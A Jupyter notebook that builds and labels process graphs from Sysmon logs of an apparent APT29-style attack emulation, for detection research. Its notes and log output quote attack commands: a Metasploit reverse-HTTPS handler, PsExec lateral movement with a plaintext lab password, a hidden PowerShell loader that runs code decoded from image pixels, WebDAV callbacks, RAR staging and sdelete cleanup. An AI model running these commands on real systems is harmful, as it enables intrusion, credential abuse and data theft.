    df = pd.concat([df.drop(['properties'], axis=1), df['properties'].apply(pd.Series)], axis=1)
    df = df.reset_index().rename(columns={"index" : "NodeID"})
    # Don't know why but the best partition label isn't set in the node attributes..
    #     it's working now. must have been an execution order issue.
    #df['BestPartition'] = df['NodeID'].apply(lambda x: (best_partition[x]))
    return df

def current_node_eval(df, malicious_root_ancestor, ancestors, descendants):
    df['Chain_Loc'] = np.nan
    df['Chain_Loc'].loc[df.NodeID.isin(list(ancestors))] = '1_Ancestor' #[['_display', 'DegreeCentrality']]
    df['Chain_Loc'].loc[df.NodeID.isin([malicious_root_ancestor])] = '2_Root' #[['_display', 'DegreeCentrality']]
    df['Chain_Loc'].loc[df.NodeID.isin(list(descendants))] = '3_Descendant' #[['_display', 'DegreeCentrality']]
    df['Chain_Loc_Int'] = np.nan
    df['Chain_Loc_Int'].loc[df.NodeID.isin([malicious_root_ancestor])] = 0 #[['_display', 'DegreeCentrality']]
    counter = 1
    for i in ancestors:
        df['Chain_Loc_Int'].loc[df['NodeID'] == i] = counter #[['_display', 'DegreeCentrality']]
        counter += 1
    columnList = ['_display', '_node_type', 'Chain_Loc', 'Chain_Loc_Int', 'BestPartition', 'Greedy_Mod', 'label_prop', 'betweenness', 'DegreeCentrality', 'ClusterCoef', 'AveNeighDegree']
    display(df.loc[(((df['Chain_Loc']=='1_Ancestor') & (df['_node_type']=='Process'))| (df['Chain_Loc']=='2_Root') | ((df['Chain_Loc']=='3_Descendant') & (df['_node_type']=='Process')))].sort_values(by=['Chain_Loc_Int'], ascending=True)[columnList])
    
def get_community_analysis(df, clustering):
    df['Chain_Loc'] = df.Chain_Loc.fillna(False)
    #df.groupby('Chain_Loc', 'Greedy_Mod').count()
    Greedy_Mod_In = dict(df.loc[df.Chain_Loc!=False][clustering].value_counts())
    Greedy_Mod_Out = dict(df.loc[df.Chain_Loc==False][clustering].value_counts())
    Greedy_Mod_All = dict(df[clustering].value_counts())

    Greedy_Mod_In_Proc = dict(df.loc[(df.Chain_Loc!=False) & (df._node_type=='Process')][clustering].value_counts())
    Greedy_Mod_In_Proc

    Greedy_Mod_Out_Proc = dict(df.loc[(df.Chain_Loc==False) & (df._node_type=='Process')][clustering].value_counts())
    Greedy_Mod_All_Proc = dict(df.loc[(df._node_type=='Process')][clustering].value_counts())

    combo_dict = {}
    for i, j in Greedy_Mod_In.items():
        combo_dict[i] = {
            'in_all' : j,
            'out_all' : 0,
            'all_all' : Greedy_Mod_All[i],
            'in_proc' : 0,
            'out_proc' : 0,
            'all_proc' : 0,
        }
        if i in Greedy_Mod_Out:
            combo_dict[i]['out_all'] = Greedy_Mod_Out[i]
        combo_dict[i]['All_Type_Percent_Malicious'] = (combo_dict[i]['in_all'] / combo_dict[i]['all_all'])

        if i in Greedy_Mod_Out_Proc:
            combo_dict[i]['out_proc'] = Greedy_Mod_Out_Proc[i]

        if i in Greedy_Mod_In_Proc:
            combo_dict[i]['in_proc'] = Greedy_Mod_In_Proc[i]

        if i in Greedy_Mod_All_Proc:
            combo_dict[i]['all_proc'] = Greedy_Mod_All_Proc[i]
            combo_dict[i]['Proc_Type_Percent_Malicious'] = (combo_dict[i]['in_proc'] / combo_dict[i]['all_proc'])

    display(pd.DataFrame(combo_dict).transpose().sort_values('Proc_Type_Percent_Malicious', ascending=False))

# %% [markdown]
# # Beagle Graph Construction

# %%
from beagle.backends import NetworkX
from beagle.transformers import SysmonTransformer

import os
import json
from typing import Dict, Generator, List

from beagle.datasources.base_datasource import DataSource
from beagle.transformers import GenericTransformer
from beagle.transformers.sysmon_transformer import SysmonTransformer

class JSONData(DataSource):
    """A generic data source which returns events one by one
    """

    name = "JSON Data"
    transformers = [SysmonTransformer]
    category = "Generic Data"

    def __init__(self, events: List[Dict]) -> None:
        self._events = events

    def events(self) -> Generator[dict, None, None]:
        for event in self._events:
            yield event

    def metadata(self) -> dict:
        return {}
    
# 4688 events just throw things off with no added information.
NX = NetworkX.from_datasources(
    datasources=[
#        WinJSONData(df_label.loc[(df_label['EventID']==4688)].to_dict('records')),
        JSONData(df_label.loc[(df_label['EventID']==1)].to_dict('records')),
        JSONData(df_label.loc[(df_label['EventID']==3)].to_dict('records')),
        JSONData(df_label.loc[(df_label['EventID']==11)].to_dict('records')),
#        JSONData(df_label.loc[(df_label['EventID']==13)].to_dict('records')),
#        JSONData(df_label.loc[(df_label['EventID']==14)].head(100).to_dict('records')),

    ]
)
G = NX.graph()
#G
graph_json = NetworkX.graph_to_json(G)

from networkx.readwrite import json_graph
G = json_graph.node_link_graph(graph_json)
G = nx.convert_node_labels_to_integers(G, first_label=0, ordering='default', label_attribute='Orig_Node_ID')
# Out:
# 2020-08-04T11:53:11 | beagle.transformers.sysmon_transformer.__init__:15 | INFO | Created Sysmon Transformer.
# 2020-08-04T11:53:11 | beagle.transformers.base_transformer._consumer_thread:143 | WARNING | Error when parsing event, recieved exception 'float' object has no attribute 'split'
# 2020-08-04T11:53:11 | beagle.transformers.base_transformer._consumer_thread:143 | WARNING | Error when parsing event, recieved exception 'float' object has no attribute 'split'
# 2020-08-04T11:53:11 | beagle.transformers.base_transformer._consumer_thread:143 | WARNING | Error when parsing event, recieved exception 'float' object has no attribute 'split'
# 2020-08-04T11:53:11 | beagle.transformers.base_transformer._consumer_thread:143 | WARNING | Error when parsing event, recieved exception 'float' object has no attribute 'split'
# 2020-08-04T11:53:11 | beagle.transformers.base_transformer.run:111 | INFO | Finished processing of events, created 1784 nodes.
# 2020-08-04T11:53:11 | beagle.transformers.base_transformer.run:114 | WARNING | Parsing finished with errors.
# 2020-08-04T11:53:11 | beagle.transformers.sysmon_transformer.__init__:15 | INFO | Created Sysmon Transformer.
# 2020-08-04T11:53:11 | beagle.transformers.base_transformer._consumer_thread:143 | WARNING | Error when parsing event, recieved exception 'float' object has no attribute 'split'
# 2020-08-04T11:53:12 | beagle.transformers.base_transformer.run:111 | INFO | Finished processing of events, created 3687 nodes.
# 2020-08-04T11:53:12 | beagle.transformers.base_transformer.run:114 | WARNING | Parsing finished with errors.
# 2020-08-04T11:53:12 | beagle.transformers.sysmon_transformer.__init__:15 | INFO | Created Sysmon Transformer.
# 2020-08-04T11:53:12 | beagle.transformers.base_transformer._consumer_thread:143 | WARNING | Error when parsing event, recieved exception 'float' object has no attribute 'split'
# 2020-08-04T11:53:12 | beagle.transformers.base_transformer._consumer_thread:143 | WARNING | Error when parsing event, recieved exception 'float' object has no attribute 'split'
# 2020-08-04T11:53:12 | beagle.transformers.base_transformer._consumer_thread:143 | WARNING | Error when parsing event, recieved exception 'float' object has no attribute 'split'
# 2020-08-04T11:53:12 | beagle.transformers.base_transformer._consumer_thread:143 | WARNING | Error when parsing event, recieved exception 'float' object has no attribute 'split'
# 2020-08-04T11:53:12 | beagle.transformers.base_transformer.run:111 | INFO | Finished processing of events, created 4947 nodes.
# 2020-08-04T11:53:12 | beagle.transformers.base_transformer.run:114 | WARNING | Parsing finished with errors.
# 2020-08-04T11:53:12 | beagle.backends.networkx.__init__:56 | INFO | Initialized NetworkX Backend
# 2020-08-04T11:53:12 | beagle.backends.networkx.graph:73 | INFO | Beginning graph generation.
# 2020-08-04T11:53:12 | beagle.backends.networkx.graph:83 | INFO | Completed graph generation.
# 2020-08-04T11:53:12 | beagle.backends.networkx.graph:84 | INFO | Graph contains 2054 nodes and 4188 edges.
# 2020-08-04T11:53:12 | beagle.backends.networkx.__init__:56 | INFO | Initialized NetworkX Backend

# %% [markdown]
# # Malicious Activity

# %% [raw]
# So reg keys don't show up in the descendant subgraph? There is persistance established here no? Checking emulation plan.
#
# The attacker establishes two distinct means of persistent access to the victim by creating a new service (T1050) and creating a malicious payload in the Windows Startup folder (T1060)	[meterpreter (PowerShell)\*] > Invoke-Persistence -PersistStep 2
#
# This is on scranton. Guess it doesn't get rolled up in the DAG.

# %% [raw]
# ==========================================
# Scranton Initial Compromise:
# ==========================================
# The scenario begins with an initial breach, where a legitimate user clicks (T1204) an executable payload (screensaver executable) masquerading as a benign word document (T1036). Once executed, the payload creates a C2 connection over port 1234 (T1065) using the RC4 cryptographic cipher .
#
# Double click `3aka3.doc` on C:\programdata\victim\
# ==========================================
# Scranton Initial Compromise Node Data:
# ==========================================
# {'properties': {'process_guid': '{47ab858c-e13c-5eac-a903-000000000400}', 'host': 'SCRANTON.dmevals.local', 'process_id': 8524, 'user': nan, 'process_image': 'â€®cod.3aka3.scr', 'process_image_path': 'C:\\ProgramData\\victim', 'command_line': '"C:\\ProgramData\\victim\\â€®cod.3aka3.scr" /S', 'hashes': {'sha1': '4B7FA56A4E85F88B98D11A6E018698AE3FBA5E62', 'md5': '9D1C5EF38E6073661C74660B3A71A76E', 'sha256': '0DF38A55D940F498478EB03683C94D4584236E100125B526A67650BA54DF4AE4', 'imphash': 'F00447512A354E59D39D2818AABA4A17'}, 'process_path': 'C:\\ProgramData\\victim\\â€®cod.3aka3.scr'}, '_node_type': 'Process', '_node_class': 'SysMonProc', '_display': 'â€®cod.3aka3.scr', '_color': '#FF0000', 'Orig_Node_ID': -7553225382156665427}
#
# ==========================================
# Nashua LM:
# ==========================================
# Next, the attacker uploads a new UPX-packed payload (T1045) to the secondary victim.	"Start a new instance of Metasploit, and spawn a Metasploit handler:
#
# [msf] > handler -H 0.0.0.0 -P 8443 -p python/meterpreter/reverse_https
#
# Return to current Meterpreter session:
#
# [meterpreter (PowerShell)\*] > Invoke-SeaDukeStage -ComputerName NASHUA"
# This new payload is executed on the secondary victim via the PSExec utility (T1077, T1035) using the previously stolen credentials (T1078).	"Execute SEADUKE Remotely via PSEXEC
#
# [meterpreter (PowerShell)\*] >
#
# .\PsExec64.exe -accepteula \\NASHUA -u ""dmevals\pbeesly"" -p ""Fl0nk3rt0n!T0by"" -i <Session Number from step 8.A. e.g. 4> ""C:\Windows\Temp\python.exe"""
# ==========================================
# Nashua LM Node Data:
# ==========================================
# {'properties': {'process_guid': '{5aa8ec29-e5b7-5eac-7603-000000000400}', 'host': 'NASHUA.dmevals.local', 'process_id': 1624, 'user': 'NT AUTHORITY\\SYSTEM', 'process_image': 'PSEXESVC.exe', 'process_image_path': 'C:\\Windows', 'command_line': 'C:\\windows\\PSEXESVC.exe', 'hashes': {'sha1': 'F1E36E0E34276A5015040780E14B58EFD1112B76', 'md5': 'AE5BB9F3FFF1AEAAAD619BAB105B2391', 'sha256': '224F549F33854ED53667055786DC1073E64B7428FAE26F27DAB9828ED502BB99', 'imphash': '09D5553D2AA2F39BDE811B88883DE7D5'}, 'process_path': 'C:\\Windows\\PSEXESVC.exe'}, '_node_type': 'Process', '_node_class': 'SysMonProc', '_display': 'PSEXESVC.exe', '_color': '#FF0000'}
#
# ==========================================
# Scranton Persistence:
# ==========================================
# The original victim is rebooted and the legitimate user logs in, emulating ordinary usage and a passage of time. This activity triggers the previously established persistence mechanisms, namely the execution of the new service (T1035) and payload in the Windows Startup folder (T1060). 	"Reboot Windows SCRANTON; wait for system to boot up
#
# You should receive a callback with SYSTEM permissions from the javamtsup service"
# The payload in the Startup folder executes a follow-on payload using a stolen token (T1106, T1134). 	Trigger the Startup Folder persistence by logging in to Windows SCRANTON
#     javamtsup service: {47ab858c-e6b2-5eac-4d00-000000000500}
#     startup folder: 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\hostui.lnk'
#         NodeID: 659

# %%
df = get_graph_dataframe(G)
df.head(1)
# Out:
#    NodeID _node_type _node_class     _display   _color        Orig_Node_ID  \
# 0       0    Process  SysMonProc  svchost.exe  #FF0000  433513158498849100
#
#                              process_guid                    host  process_id  \
# 0  {47ab858c-cadc-5eac-2200-000000000400}  SCRANTON.dmevals.local      1448.0
#
#    user process_image   process_image_path command_line hashes  \
# 0  None   svchost.exe  C:\Windows\System32         None     {}
#
#                       process_path file_path file_name full_path  extension  \
# 0  C:\Windows\System32\svchost.exe       NaN       NaN       NaN        NaN
#
#   ip_address  mac
# 0        NaN  NaN

# %% [markdown]
# # Graph Labelling Approach

# %% [markdown]
# ## Scranton Initial Compromise

# %% [raw]
# ==========================================
# Scranton Initial Compromise:
# ==========================================
# The scenario begins with an initial breach, where a legitimate user clicks (T1204) an executable payload (screensaver executable) masquerading as a benign word document (T1036). Once executed, the payload creates a C2 connection over port 1234 (T1065) using the RC4 cryptographic cipher .
#
# Double click `3aka3.doc` on C:\programdata\victim\
# ==========================================
# Scranton Initial Compromise Node Data:
# ==========================================
# {'properties': {'process_guid': '{47ab858c-e13c-5eac-a903-000000000400}', 'host': 'SCRANTON.dmevals.local', 'process_id': 8524, 'user': nan, 'process_image': 'â€®cod.3aka3.scr', 'process_image_path': 'C:\\ProgramData\\victim', 'command_line': '"C:\\ProgramData\\victim\\â€®cod.3aka3.scr" /S', 'hashes': {'sha1': '4B7FA56A4E85F88B98D11A6E018698AE3FBA5E62', 'md5': '9D1C5EF38E6073661C74660B3A71A76E', 'sha256': '0DF38A55D940F498478EB03683C94D4584236E100125B526A67650BA54DF4AE4', 'imphash': 'F00447512A354E59D39D2818AABA4A17'}, 'process_path': 'C:\\ProgramData\\victim\\â€®cod.3aka3.scr'}, '_node_type': 'Process', '_node_class': 'SysMonProc', '_display': 'â€®cod.3aka3.scr', '_color': '#FF0000', 'Orig_Node_ID': -7553225382156665427}

# %%
# Get Scranton Initial Compromise Descendants
H, malicious_root_ancestor, ancestors, descendants, file_nodes, proc_nodes, ip_nodes = manual_recurse_pipeline(G, '{47ab858c-e13c-5eac-a903-000000000400}')
# Out:
# ==========================================
# Node Data:
# ==========================================
# {'properties': {'process_guid': '{47ab858c-dac4-5eac-f202-000000000400}', 'host': 'SCRANTON.dmevals.local', 'process_id': 4440, 'user': nan, 'process_image': 'Explorer.EXE', 'process_image_path': 'C:\\windows', 'command_line': None, 'hashes': {}, 'process_path': 'C:\\windows\\Explorer.EXE'}, '_node_type': 'Process', '_node_class': 'SysMonProc', '_display': 'Explorer.EXE', '_color': '#FF0000', 'Orig_Node_ID': -5851651470777670033}
# ==========================================
# Malicious? Enter yes or no:  no
# ##########################################
# Confirm this as the senior malicious node?
# ##########################################
# Node Data:
# ==========================================
# {'properties': {'process_guid': '{47ab858c-e13c-5eac-a903-000000000400}', 'host': 'SCRANTON.dmevals.local', 'process_id': 8524, 'user': nan, 'process_image': 'â€®cod.3aka3.scr', 'process_image_path': 'C:\\ProgramData\\victim', 'command_line': '"C:\\ProgramData\\victim\\â€®cod.3aka3.scr" /S', 'hashes': {'sha1': '4B7FA56A4E85F88B98D11A6E018698AE3FBA5E62', 'md5': '9D1C5EF38E6073661C74660B3A71A76E', 'sha256': '0DF38A55D940F498478EB03683C94D4584236E100125B526A67650BA54DF4AE4', 'imphash': 'F00447512A354E59D39D2818AABA4A17'}, 'process_path': 'C:\\ProgramData\\victim\\â€®cod.3aka3.scr'}, '_node_type': 'Process', '_node_class': 'SysMonProc', '_display': 'â€®cod.3aka3.scr', '_color': '#FF0000', 'Orig_Node_ID': -3098171945946655529}
# ==========================================
# Edge Out Data:
# ==========================================
# Launched
# {'properties': {'process_guid': '{47ab858c-e188-5eac-af03-000000000400}', 'host': 'SCRANTON.dmevals.local', 'process_id': 3152, 'user': 'DMEVALS\\pbeesly', 'process_image': 'conhost.exe', 'process_image_path': 'C:\\Windows\\System32', 'command_line': '\\\\?\\C:\\windows\\system32\\conhost.exe --headless --width 80 --height 25 --signal 0x474 --server 0x50c', 'hashes': {'sha1': '11996F32DD85863A8C3BFF6D520F788A9211C8F7', 'md5': 'C5E9B1D1103EDCEA2E408E9497A5A88F', 'sha256': 'BAF97B2A629723947539CFF84E896CD29565AB4BB68B0CEC515EB5C5D6637B69', 'imphash': 'F8DD0EF565DE87D97ABF9C62EA63EC21'}, 'process_path': 'C:\\Windows\\System32\\conhost.exe'}, '_node_type': 'Process', '_node_class': 'SysMonProc', '_display': 'conhost.exe', '_color': '#FF0000', 'Orig_Node_ID': 5330985653128869377}
# ==========================================
# Launched
# {'properties': {'process_guid': '{47ab858c-e188-5eac-b003-000000000400}', 'host': 'SCRANTON.dmevals.local', 'process_id': 3480, 'user': 'DMEVALS\\pbeesly', 'process_image': 'cmd.exe', 'process_image_path': 'C:\\Windows\\System32', 'command_line': '"C:\\windows\\system32\\cmd.exe"', 'hashes': {'sha1': '8DCA9749CD48D286950E7A9FA1088C937CBCCAD4', 'md5': 'D7AB69FAD18D4A643D84A271DFC0DBDF', 'sha256': 'FF79D3C4A0B7EB191783C323AB8363EBD1FD10BE58D8BCC96B07067743CA81D5', 'imphash': '272245E2988E1E430500B852C4FB5E18'}, 'process_path': 'C:\\Windows\\System32\\cmd.exe'}, '_node_type': 'Process', '_node_class': 'SysMonProc', '_display': 'cmd.exe', '_color': '#FF0000', 'Orig_Node_ID': 8012618080571078460}
# ==========================================
# Launched
# {'properties': {'process_guid': '{47ab858c-e144-5eac-ab03-000000000400}', 'host': 'SCRANTON.dmevals.local', 'process_id': 2772, 'user': 'DMEVALS\\pbeesly', 'process_image': 'cmd.exe', 'process_image_path': 'C:\\Windows\\System32', 'command_line': '"C:\\windows\\system32\\cmd.exe"', 'hashes': {'sha1': '8DCA9749CD48D286950E7A9FA1088C937CBCCAD4', 'md5': 'D7AB69FAD18D4A643D84A271DFC0DBDF', 'sha256': 'FF79D3C4A0B7EB191783C323AB8363EBD1FD10BE58D8BCC96B07067743CA81D5', 'imphash': '272245E2988E1E430500B852C4FB5E18'}, 'process_path': 'C:\\Windows\\System32\\cmd.exe'}, '_node_type': 'Process', '_node_class': 'SysMonProc', '_display': 'cmd.exe', '_color': '#FF0000', 'Orig_Node_ID': 955733928896881870}
# ==========================================
# Launched
# {'properties': {'process_guid': '{47ab858c-e144-5eac-aa03-000000000400}', 'host': 'SCRANTON.dmevals.local', 'process_id': 5156, 'user': 'DMEVALS\\pbeesly', 'process_image': 'conhost.exe', 'process_image_path': 'C:\\Windows\\System32', 'command_line': '\\\\?\\C:\\windows\\system32\\conhost.exe --headless --width 80 --height 25 --signal 0x54c --server 0x540', 'hashes': {'sha1': '11996F32DD85863A8C3BFF6D520F788A9211C8F7', 'md5': 'C5E9B1D1103EDCEA2E408E9497A5A88F', 'sha256': 'BAF97B2A629723947539CFF84E896CD29565AB4BB68B0CEC515EB5C5D6637B69', 'imphash': 'F8DD0EF565DE87D97ABF9C62EA63EC21'}, 'process_path': 'C:\\Windows\\System32\\conhost.exe'}, '_node_type': 'Process', '_node_class': 'SysMonProc', '_display': 'conhost.exe', '_color': '#FF0000', 'Orig_Node_ID': -497204434563051136}
# ==========================================
# Malicious? Enter yes or no:  yes
# 1357
# 1357
# 489
# 4
# 494
# /home/jake/miniconda3/envs/py3msc/lib/python3.7/site-packages/networkx/drawing/nx_pylab.py:579: MatplotlibDeprecationWarning:
# The iterable function was deprecated in Matplotlib 3.1 and will be removed in 3.3. Use np.iterable instead.
#   if not cb.iterable(width):
# /home/jake/miniconda3/envs/py3msc/lib/python3.7/site-packages/networkx/drawing/nx_pylab.py:676: MatplotlibDeprecationWarning:
# The iterable function was deprecated in Matplotlib 3.1 and will be removed in 3.3. Use np.iterable instead.
#   if cb.iterable(node_size):  # many node sizes
# Saving as: ancestor_descendants_1357.png
# Saving as: ancestor_descendants_nodeType_1357.png
# 35
# /home/jake/miniconda3/envs/py3msc/lib/python3.7/site-packages/pandas/core/indexing.py:671: SettingWithCopyWarning:
# A value is trying to be set on a copy of a slice from a DataFrame
#
# See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy
#   self._setitem_with_indexer(indexer, value)
#                                    ProcessGuid                Hostname  \
# 8974    {47ab858c-e342-5eac-d703-000000000400}  SCRANTON.dmevals.local
# 14768   {47ab858c-e23d-5eac-c603-000000000400}  SCRANTON.dmevals.local
# 39393   {47ab858c-e2f2-5eac-d203-000000000400}  SCRANTON.dmevals.local
# 60037   {47ab858c-e1f8-5eac-bc03-000000000400}  SCRANTON.dmevals.local
# 68686   {47ab858c-e2ac-5eac-cb03-000000000400}  SCRANTON.dmevals.local
# 72642   {47ab858c-e18b-5eac-b103-000000000400}  SCRANTON.dmevals.local
# 96356   {47ab858c-e1e4-5eac-b803-000000000400}  SCRANTON.dmevals.local
# 113037  {47ab858c-e188-5eac-b003-000000000400}  SCRANTON.dmevals.local
# 120642  {47ab858c-e144-5eac-ab03-000000000400}  SCRANTON.dmevals.local
# 130522  {47ab858c-e305-5eac-d303-000000000400}  SCRANTON.dmevals.local
# 139342  {47ab858c-e374-5eac-d803-000000000400}  SCRANTON.dmevals.local
# 160348  {47ab858c-e14e-5eac-ac03-000000000400}  SCRANTON.dmevals.local
# 169201  {47ab858c-e1e3-5eac-b603-000000000400}  SCRANTON.dmevals.local
# 179251  {47ab858c-e13c-5eac-a903-000000000400}  SCRANTON.dmevals.local
# 1334    {5aa8ec29-e655-5eac-8303-000000000400}    NASHUA.dmevals.local
# 18627   {5aa8ec29-e5b8-5eac-7903-000000000400}    NASHUA.dmevals.local
# 41375   {47ab858c-e442-5eac-ed03-000000000400}  SCRANTON.dmevals.local
# 56194   {5aa8ec29-e5e4-5eac-7a03-000000000400}    NASHUA.dmevals.local
# 80262   {5aa8ec29-e52e-5eac-6b03-000000000400}    NASHUA.dmevals.local
# 83938   {47ab858c-e49f-5eac-f103-000000000400}  SCRANTON.dmevals.local
# 85882   {5aa8ec29-e56d-5eac-6e03-000000000400}    NASHUA.dmevals.local
# 95348   {5aa8ec29-e624-5eac-7f03-000000000400}    NASHUA.dmevals.local
# 146429  {47ab858c-e49e-5eac-ef03-000000000400}  SCRANTON.dmevals.local
# 149428  {47ab858c-e49f-5eac-f003-000000000400}  SCRANTON.dmevals.local
# 149429  {5aa8ec29-e603-5eac-7b03-000000000400}    NASHUA.dmevals.local
# 152248  {47ab858c-e6b2-5eac-4d00-000000000500}  SCRANTON.dmevals.local
# 162243  {47ab858c-e442-5eac-ec03-000000000400}  SCRANTON.dmevals.local
# 163244  {5aa8ec29-e618-5eac-7e03-000000000400}    NASHUA.dmevals.local
# 175284  {5aa8ec29-e5b7-5eac-7703-000000000400}    NASHUA.dmevals.local
# 180127  {5aa8ec29-e63e-5eac-8203-000000000400}    NASHUA.dmevals.local
# 196722  {5aa8ec29-e4ec-5eac-6803-000000000400}    NASHUA.dmevals.local
# 12975   {47ab858c-e374-5eac-d903-000000000400}  SCRANTON.dmevals.local
# 26578   {47ab858c-e519-5eac-f403-000000000400}  SCRANTON.dmevals.local
# 38237   {47ab858c-e1e3-5eac-b503-000000000400}  SCRANTON.dmevals.local
# 63799   {47ab858c-e1e5-5eac-bb03-000000000400}  SCRANTON.dmevals.local
# 73611   {47ab858c-e413-5eac-e903-000000000400}  SCRANTON.dmevals.local
# 88067   {47ab858c-e188-5eac-af03-000000000400}  SCRANTON.dmevals.local
# 104058  {47ab858c-e394-5eac-e303-000000000400}  SCRANTON.dmevals.local
# 114981  {47ab858c-e3d3-5eac-e603-000000000400}  SCRANTON.dmevals.local
# 115865  {47ab858c-e5a2-5eac-fb03-000000000400}  SCRANTON.dmevals.local
# 117807  {47ab858c-e1e2-5eac-b303-000000000400}  SCRANTON.dmevals.local
# 136222  {47ab858c-e558-5eac-f503-000000000400}  SCRANTON.dmevals.local
# 144331  {47ab858c-e1e4-5eac-b903-000000000400}  SCRANTON.dmevals.local
# 147546  {47ab858c-e394-5eac-e203-000000000400}  SCRANTON.dmevals.local
# 151329  {47ab858c-e23d-5eac-c703-000000000400}  SCRANTON.dmevals.local
# 154392  {47ab858c-e4d6-5eac-f303-000000000400}  SCRANTON.dmevals.local
# 155466  {47ab858c-e1e5-5eac-ba03-000000000400}  SCRANTON.dmevals.local
# 157536  {47ab858c-e413-5eac-e803-000000000400}  SCRANTON.dmevals.local
# 164294  {47ab858c-e144-5eac-aa03-000000000400}  SCRANTON.dmevals.local
# 169200  {47ab858c-e1e2-5eac-b203-000000000400}  SCRANTON.dmevals.local
# 176379  {47ab858c-e3d3-5eac-e703-000000000400}  SCRANTON.dmevals.local
#
#         orig_label  graph_label  \
# 8974          True         True
# 14768         True         True
# 39393         True         True
# 60037         True         True
# 68686         True         True
# 72642         True         True
# 96356         True         True
# 113037        True         True
# 120642        True         True
# 130522        True         True
# 139342        True         True
# 160348        True         True
# 169201        True         True
# 179251        True         True
# 1334          True        False
# 18627         True        False
# 41375         True        False
# 56194         True        False
# 80262         True        False
# 83938         True        False
# 85882         True        False
# 95348         True        False
# 146429        True        False
# 149428        True        False
# 149429        True        False
# 152248        True        False
# 162243        True        False
# 163244        True        False
# 175284        True        False
# 180127        True        False
# 196722        True        False
# 12975        False         True
# 26578        False         True
# 38237        False         True
# 63799        False         True
# 73611        False         True
# 88067        False         True
# 104058       False         True
# 114981       False         True
# 115865       False         True
# 117807       False         True
# 136222       False         True
# 144331       False         True
# 147546       False         True
# 151329       False         True
# 154392       False         True
# 155466       False         True
# 157536       False         True
# 164294       False         True
# 169200       False         True
# 176379       False         True
#
#                                                                                                                                                                                                                                                                                                                                                                                                                           CommandLine
# 8974                                                                                                                                                                                                                                                                                                                                                                               "C:\Program Files\SysinternalsSuite\accesschk.exe"
# 14768                                                                                                                                                                                                                                                                                                                                                                                                                  powershell.exe
# 39393                                                                                                                                                                                                                                                                                                                       "C:\Program Files\SysinternalsSuite\sdelete64.exe" /accepteula C:\Users\pbeesly\AppData\Roaming\Draft.Zip
# 60037                                                                                                                                                                                                                                                                                                                                                                                                                      powershell
# 68686                                                                                                                                                                                                                                                                                                                           "C:\Program Files\SysinternalsSuite\sdelete64.exe" /accepteula C:\programdata\victim\???cod.3aka3.scr
# 72642                                                                                                                                                                                                                                                                                                                                                                                                                      powershell
# 96356   "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbeesly\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"
# 113037                                                                                                                                                                                                                                                                                                                                                                                                  "C:\windows\system32\cmd.exe"
# 120642                                                                                                                                                                                                                                                                                                                                                                                                  "C:\windows\system32\cmd.exe"
# 130522                                                                                                                                                                                                                                                                                                                "C:\Program Files\SysinternalsSuite\sdelete64.exe" /accepteula C:\Users\pbeesly\Downloads\SysinternalsSuite.zip
# 139342                                                                                                                                                                                                                                                                                                                                                                                                                 powershell.exe
# 160348                                                                                                                                                                                                                                                                                                                                                                                                                     powershell
# 169201                                                                                                                                                                                                                                                                                                                                                      "C:\Windows\System32\control.exe"  /name Microsoft.BackupAndRestoreCenter
# 179251                                                                                                                                                                                                                                                                                                                                                                                    "C:\ProgramData\victim\â€®cod.3aka3.scr" /S
# 1334                                                                                                                                                                                                                                                                                                                                                              .\sdelete64.exe  /accepteula "C:\Users\pbeesly\Desktop\working.zip"
# 18627                                                                                                                                                                                                                                                                                                                                                                                                   "C:\Windows\Temp\python.exe"
# 41375                                                                                                                                                                                                                                                                                                                                 rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
# 56194                                                                                                                                                                                                                                                                                                                                                                                                                  powershell.exe
# 80262                                                                                                                                                                                                                                                                                                                                                                                                   "C:\Windows\Temp\python.exe"
# 83938                                                                                                                                                                                                                                                                                                                                 rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
# 85882                                                                                                                                                                                                                                                                                                                                                                                                   "C:\Windows\Temp\python.exe"
# 95348                                                                                                                                                                                                                                                                                                                                                                          .\sdelete64.exe  /accepteula "C:\Windows\Temp\Rar.exe"
# 146429                                                                                                                                                                                                                                                                                                                                rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
# 149428                                                                                                                                                                                                                                                                                                                                rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
# 149429                                                                                                                                                                                                                                                                                                      "C:\Windows\Temp\Rar.exe" a -hpfGzq5yKw C:\Users\pbeesly\Desktop\working.zip C:\Users\pbeesly\AppData\Roaming\working.zip
# 152248                                                                                                                                                                                                                                                                                                                                                                                              C:\Windows\System32\javamtsup.exe
# 162243                                                                                                                                                                                                                                                                                                                                rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
# 163244                                                                                                                                                                                                                                                                                                                                                                                                    C:\windows\system32\cmd.exe
# 175284                                                                                                                                                                                                                                                                                                                                                                                                  "C:\Windows\Temp\python.exe"
# 180127                                                                                                                                                                                                                                                                                                                                                   .\sdelete64.exe  /accepteula "C:\Users\pbeesly\AppData\Roaming\working.zip"
# 196722                                                                                                                                                                                                                                                                                                                                                                                                  "C:\Windows\Temp\python.exe"
# 12975                                                                                                                                                                                                                                                                                                                                                                         \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1
# 26578                                                                                                                                                                                                                                                                                    "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe
# 38237                                                                                                                                                                                                                                                                                                                                                                                                "C:\windows\system32\sdclt.exe"
